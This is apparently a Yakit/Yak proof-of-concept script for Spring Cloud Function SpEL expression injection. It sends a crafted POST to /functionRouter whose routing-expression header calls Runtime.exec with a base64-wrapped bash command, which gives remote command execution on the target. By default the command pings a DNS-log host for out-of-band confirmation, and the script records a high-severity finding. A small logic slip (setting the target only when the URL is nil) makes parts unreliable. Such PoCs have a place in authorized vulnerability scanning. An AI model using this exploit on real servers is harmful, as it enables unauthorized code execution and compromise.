
isHttps = cli.Have("https", cli.setDefault(false))
target = cli.String("target", cli.setDefault("ip:port || URL"))
cmd = cli.String("cmd", cli.setDefault("ping dnslog.com"))
cmd = codec.EncodeBase64(cmd)
cmd = "bash -c {echo," + cmd + "}|{base64,-d}|{bash,-i}"


packet = `
POST /functionRouter HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("{{params(cmd)}}")

test

`

debug = cli.Have("debug", cli.setDefault(true))

if debug {
    loglevel("debug")
}

sendPacket = func(target,cmd) {
    return poc.HTTP(
        packet, 
        poc.timeout(10),
        # poc.proxy("http://127.0.0.1:8083"),
        # poc.proxy("http://127.0.0.1:7890"),
        poc.redirectTimes(1),  # 重定向次数
        poc.https(isHttps),
        poc.params({
            "target": target,
            "cmd": cmd,
        },
    ))
}

if YAK_MAIN {
    rspBytes, reqBytes, err = sendPacket(target,cmd)
    if err != nil {
        log.error("send packet error: %s", err)
        return
    }

    if debug {
        println(string(reqBytes))
        println("---------------------------------")
        println(string(rspBytes))
    }

    riskTarget = target
    if str.MatchAllOfRegexp(rspBytes, `foundtextinRsp`) || str.MatchAllOfSubString(rspBytes, "FoundTextInResponse") {
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(reqBytes, isHttps)
        if urlIns == nil {
            riskTarget = urlIns.String()
        }
        yakit.Info("Matched for %v", target)
        # Save to RiskTable
        risk.NewRisk(
            riskTarget, risk.severity("high"), risk.type("poc"),
            risk.title("Spring Cloud Function SPEL POC"),         
            risk.titleVerbose("Spring Cloud Function SPEL表达式注入 POC"),         
            risk.details({
                "target": riskTarget,
                "request": reqBytes,
                "response": rspBytes,
            }),
        )
    }
}